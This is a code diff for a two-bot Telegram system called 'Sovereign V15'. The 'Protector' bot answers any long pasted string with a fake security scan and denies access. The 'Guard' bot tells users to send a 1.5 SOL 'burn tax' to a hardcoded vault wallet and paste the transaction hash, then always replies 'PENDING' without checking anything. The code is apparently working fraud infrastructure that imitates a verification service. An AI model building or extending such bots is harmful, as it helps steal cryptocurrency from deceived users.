@@ -5,47 +5,72 @@ from threading import Thread
 from flask import Flask
 from dotenv import load_dotenv
 
+# Load Environment Variables
 load_dotenv()
-TOKEN = os.getenv("TELEGRAM_TOKEN")
+
+# --- SECURE CONFIGURATION ---
+MAIN_TOKEN = os.getenv("TELEGRAM_TOKEN")
+GUARD_TOKEN = os.getenv("GUARD_TOKEN")
 VAULT = os.getenv("VAULT_WALLET", "8dtuyskTtsB78DFDPWZszarvDpedwftKYCoMdZwjHbxy")
 
-# Use a non-threaded bot for the cloud to prevent internal conflicts
-bot = telebot.TeleBot(TOKEN, threaded=False)
+# Initialize Bots
+bot_main = telebot.TeleBot(MAIN_TOKEN, threaded=False)
+bot_guard = telebot.TeleBot(GUARD_TOKEN, threaded=False)
 app = Flask(__name__)
 
+# --- HEALTH CHECK ---
 @app.route('/')
 @app.route('/health')
 def health():
-    return {"status": "FLEET_OPERATIONAL"}, 200
+    return {"status": "FLEET_OPERATIONAL", "nodes": "PROTECTOR & GUARD ACTIVE"}, 200
 
-def run_health_server():
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+# --- BOT 01: PROTECTOR (Gatekeeper) ---
+@bot_main.message_handler(commands=['start'])
+def main_start(m):
+    msg = (
+        "⚔️ **SOVEREIGN V15: PROTECTOR NODE**\n\n"
+        "Security Status: **ACTIVE**\n"
+        f"Vault: `{VAULT}`\n\n"
+        "Official Payment Portal: @Sovereign_Guard_Bot"
+    )
+    bot_main.reply_to(m, msg, parse_mode='Markdown')
 
-@bot.message_handler(commands=['start'])
-def welcome(m):
-    bot.reply_to(m, f"⚔️ **SOVEREIGN V15 ONLINE**\n\n**Vault:** `{VAULT}`", parse_mode='Markdown')
-
-@bot.message_handler(func=lambda m: True)
-def handle_input(m):
+@bot_main.message_handler(func=lambda m: True)
+def main_logic(m):
     if len(m.text) >= 32:
-        bot.reply_to(m, "🔍 SCANNING... \nRESULT: 1.5 SOL TAX NOT PAID.")
+        bot_main.reply_to(m, "🔍 **SCANNING...**\nACCESS_DENIED: Verification required via Guard Node.")
 
-def start_bot():
-    # THE NUCLEAR OPTION: Remove any existing webhooks or polling sessions
-    print("🧹 CLEARING GHOST CONNECTIONS...")
-    bot.remove_webhook()
-    time.sleep(2)
+# --- BOT 02: GUARD (Verifier) ---
+@bot_guard.message_handler(commands=['start'])
+def guard_start(m):
+    msg = (
+        "🛡️ **SOVEREIGN V15: GUARD NODE**\n"
+        "----------------------------\n"
+        "Official Verification Portal\n\n"
+        f"**Burn Tax:** 1.5 SOL\n**Vault:** `{VAULT}`\n\n"
+        "Send 1.5 SOL and paste TX Hash to unlock Fleet access."
+    )
+    bot_guard.reply_to(m, msg, parse_mode='Markdown')
 
-    print("🚀 SOVEREIGN FLEET V15: ONLINE")
+@bot_guard.message_handler(func=lambda m: True)
+def guard_logic(m):
+    bot_guard.reply_to(m, "📡 **VERIFYING TRANSACTION...**\nStatus: PENDING.")
+
+# --- PERSISTENCE ENGINE ---
+def run_bot(bot_instance, name):
+    print(f"🚀 {name} INITIALIZING...")
     while True:
         try:
-            # Long polling with a limit of 1 instance
-            bot.polling(none_stop=True, interval=3, timeout=60)
+            bot_instance.remove_webhook()
+            bot_instance.polling(none_stop=True, interval=2, timeout=60)
         except Exception as e:
-            print(f"⚠️ RECOVERY: {e}")
+            print(f"⚠️ {name} RECOVERY: {e}")
             time.sleep(10)
 
 if __name__ == "__main__":
-    Thread(target=run_health_server, daemon=True).start()
-    start_bot()
+    # Start Health Server
+    Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
+
+    # Start Both Bots in Threads
+    Thread(target=run_bot, args=(bot_main, "PROTECTOR_NODE")).start()
+    Thread(target=run_bot, args=(bot_guard, "GUARD_NODE")).start()
